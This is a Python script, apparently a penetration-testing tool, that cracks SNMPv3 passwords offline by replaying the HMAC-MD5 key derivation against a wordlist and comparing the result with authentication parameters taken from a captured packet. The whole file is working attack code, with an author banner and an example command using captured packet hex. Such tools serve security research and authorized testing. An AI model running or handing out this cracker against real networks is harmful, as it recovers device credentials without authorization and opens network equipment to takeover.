# https://applied-risk.com/resources/brute-forcing-snmpv3-authentication
import hashlib
import argparse
from colorama import Fore

class SNMP_Brute_Forcer():

	def __init__(self, wordlist, msgAuthenticationParameters, msgAuthoritativeEngineID, wholeMsg):
		self.IPAD = '36'*64
		self.OPAD = '5c'*64
		self.S_LONG = 1048576
		self.wordlist = wordlist
		self.msgAuthenticationParameters = msgAuthenticationParameters
		self.msgAuthoritativeEngineID = msgAuthoritativeEngineID
		self.wholeMsg = wholeMsg

	def xor(self, key, pad):
		r = ''
		for j in range(0, len(key)-1, 2):
			value = int(key[j:j+2],16)^int(pad[j:j+2], 16)
			if value < 16:
				r += '0' + str(hex(value))[2:]
			else:
				r+=str(hex(value))[2:]
		return r

	def check_password(self, password):
		password = password.strip()
		if len(password) != 0:
			r = (self.S_LONG % len(password))
			b = int(self.S_LONG / len(password))
		else:
			r = 0
			b =self.S_LONG
		string = password * b + password[:r]
		digest = hashlib.md5(string.encode()).hexdigest()
		authKey = hashlib.md5(bytes.fromhex(digest) + bytes.fromhex(self.msgAuthoritativeEngineID) + bytes.fromhex(digest)).hexdigest()
		authKeyExtended = authKey + ('0' * (128 - len(authKey)))
		K1 = self.xor(authKeyExtended, self.IPAD)
		K2 = self.xor(authKeyExtended, self.OPAD)
		wholeMsgMod= self.wholeMsg.replace(self.msgAuthenticationParameters, "0"*24)
		hashK1 = hashlib.md5(bytes.fromhex(K1) + bytes.fromhex(wholeMsgMod)).hexdigest()
		hashK2 = hashlib.md5(bytes.fromhex(K2) + bytes.fromhex(hashK1)).hexdigest()
		MAC = hashK2[:24]
		if MAC == self.msgAuthenticationParameters:
			print(f"{Fore.GREEN}[+] Password found : {password}{Fore.RESET}")
			return True
		return False

	def brute_force(self):
		with open(self.wordlist, "r") as w:
			passwords = w.readlines()

		for password in passwords:
			flag = self.check_password(password)
			if flag:
				return flag

def parseArgs():
	parser = argparse.ArgumentParser(add_help=True, description='This tool allows you to brute force an SNMPv3 authentification')
	parser.add_argument("--wordlist", dest="wordlist", required=True, help="Specify the wordlist with passwords you want to use.")
	parser.add_argument("--map", dest="msgAuthenticationParameters", required=True, help="Specify the msgAuthenticationParameters which can be found in the captured SNMPv3 authentification")
	parser.add_argument("--maeid", dest="msgAuthoritativeEngineID", required=True, help="Specify the msgAuthoritativeEngineID which can be found in the captured SNMPv3 authentification")
	parser.add_argument("--msg", dest="wholeMsg", required=True, help="Specify the whole message sended in SNM starting by 3081")
	args = parser.parse_args()
	return args

def banner(W, mAP, mAEID, wM):
	content = f"""
  o__ __o                   o__ __o      o          o    o          o    o__ __o   
 <|     v\                 /v     v\    <|\        <|>  <|\        /|>  <|     v\  
 / \     <\               />       <\   / \\o      / \  / \\o    o// \  / \     <\ 
 \o/       \o            _\o____        \o/ v\     \o/  \o/ v\  /v \o/  \o/     o/ 
  |         |>  _\__o__       \_\__o__   |   <\     |    |   <\/>   |    |__  _<|/ 
 / \       //        \              \   / \    \o  / \  / \        / \   |         
 \o/      /               \         /   \o/     v\ \o/  \o/        \o/  <o>        
  |      o                 o       o     |       <\ |    |          |    |         
 / \  __/>                 <\__ __/>    / \        < \  / \        / \  / \        

{Fore.CYAN}[+] Author : D0pp3lgang3r{Fore.RESET}
{Fore.WHITE}[+] Date : 03/07/2023{Fore.RESET}
{Fore.YELLOW}[*] Cracking SNMP password using :
             [>] Wordlist : {W}
             [>] msgAuthenticationParameters : {mAP}
             [>] msgAuthoritativeEngineID : {mAEID}
             [>] wholeMessage : {wM}
{Fore.RESET}
	"""
	return content

def main():
	args = parseArgs()
	print(banner(args.wordlist, args.msgAuthenticationParameters, args.msgAuthoritativeEngineID, args.wholeMsg))
	snmp = SNMP_Brute_Forcer(args.wordlist, args.msgAuthenticationParameters, args.msgAuthoritativeEngineID, args.wholeMsg)
	if not snmp.brute_force():
		print(f"{Fore.RED}[-] Password not found :({Fore.RESET}")

if __name__ == '__main__':
	main()
# python3 d_snmp.py --wordlist wordlist.txt --map 31f53fd6ac7b0876ef5083ef --maeid 80001f8880409cdf53df82d65d00000000 --msg 30818b02010330110204528a02fa020300ffe3040107020103043f303d041180001f8880409cdf53df82d65d00000000020102020207c90409736e6d705f75736572040c31f53fd6ac7b0876ef5083ef0408d554919cf49f6d6f0432fbc09b01e7682496c257d786ce5365213564227e0c845bb787557ad5afc1b8e96f69072e87d0d1dfa270839dbb76a1dd0d3b
